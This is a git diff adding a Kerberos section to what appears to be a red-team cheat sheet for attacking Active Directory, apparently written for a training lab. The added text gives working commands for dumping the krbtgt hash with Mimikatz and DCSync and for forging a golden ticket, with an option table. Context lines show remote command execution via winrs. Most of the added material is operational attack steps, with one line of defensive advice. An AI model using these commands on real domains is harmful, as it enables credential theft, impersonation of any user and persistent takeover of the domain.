@@ -6,7 +6,10 @@
   * [Enumeration using PowerView](#domain-enumeration-using-powerview)
   * [Bloodhound](#bloodhound)
 * [Privilege Escalation](#privilege-escalation)
-  * [Local Privilege Escalation](#local-admin-privilege-escalation-using-powerup)  
+  * [Local Privilege Escalation](#local-admin-privilege-escalation-using-powerup)
+* [Kerberos](#kerberos)
+  * [Introduction] (#introduction)
+  * 
 
 ## General
 Connect to a machine with Administrator privileges
@@ -680,6 +683,51 @@ Performing the command
 ```
 $null | winrs -r:dcorp-mgmt "cmd C:\Users\Public\Safety.bat"
 ```
+
+## Kerberos
+
+### Introduction
+Kerberos is the basis of authentication in a Windows Active Directory environment. Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller. These tickets represent the client's credentials. Therefore Kerberos is a very interesting target to abuse.
+
+### Persistence using Golden Tickets
+A golden ticket is signed and encrypted by the hash of **krbtgt** account which makes it a valid TGT ticket. The **krbtgt** hash could be used to impersonate any user with any privileges from even a non-domain machine. As a good practice it is recommended to change the password of **krbtgt** account twice as password history is mantained for the account.
+
+**Requirements**
+- Krbtgt hash
+
+In order to get the krbtgt hash there are several ways:
+1. Execute Mimikatz or a variant on Domain Controller having Domain Admin privileges
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+```
+2. Use the DCSync feature for getting AES keys of krbtgt account. Use the command below with Domain Admin privileges, this command does not need code execution on Domain Controller
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+3. Dump the NTDS.dit file
+
+**Get a Golden Ticket**
+
+To get a golden ticket run the following command on a machine that has network connectivity with the domain controller:
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /aes256:<aes256_of_krbtgt> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+
+**Summary**
+|  Options | Description  |
+|---|---|
+|  kerberos::golden | Name of the module  | 
+| /user:  | username for which the TGT is required  |
+|  /domain | domain FQDN  |
+| /sid | domain sid |
+| /aes256 | krbtgt aes256 |
+| /id /groups | Optional user RID (default 500) and Group default 513, 512, 520, 518, 519 |
+| /ptt or /ticket | /ptt injects the ticket in current process, /ticket saves the ticket for later use |
+| /startoffset | Optional when the ticket is available in minutes |
+| /endin | Optional Ticket lifetime in minutes (default 10 years) default DC setting is 600 |
+| /renewmax | Optional ticket lifetime with renewal (default 10 years) default DC setting is 100800 |
+
+
 
 
 
